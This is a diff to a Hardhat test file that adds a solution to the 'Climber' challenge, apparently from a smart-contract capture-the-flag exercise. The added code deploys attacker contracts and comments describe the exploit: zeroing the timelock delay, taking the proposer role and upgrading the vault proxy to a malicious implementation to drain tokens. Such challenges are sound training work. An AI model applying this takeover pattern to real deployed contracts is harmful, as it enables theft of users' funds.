@@ -53,6 +53,17 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // call execute with updateDelay to 0, and then propose this set of actions
+        // now able to propose something else, upgradeTo my contract
+        // my contract is ClimberVault2, which just allows anyone to set sweeper
+        const climberVault2 = await (await ethers.getContractFactory('ClimberVault2', attacker)).deploy();
+
+        const attackClimber = await (await ethers.getContractFactory('AttackClimber', attacker)).deploy(this.timelock.address, this.vault.address, climberVault2.address);
+        
+        await attackClimber.connect(attacker).attack(this.token.address);
+
+        // have proposer role on AttackClimber at this point. Need to do and upgradeWithCall 
+        // on the proxy contract -- can upgrade to a new deployment with function that gives approvals to the attacker
     });
 
     after(async function () {
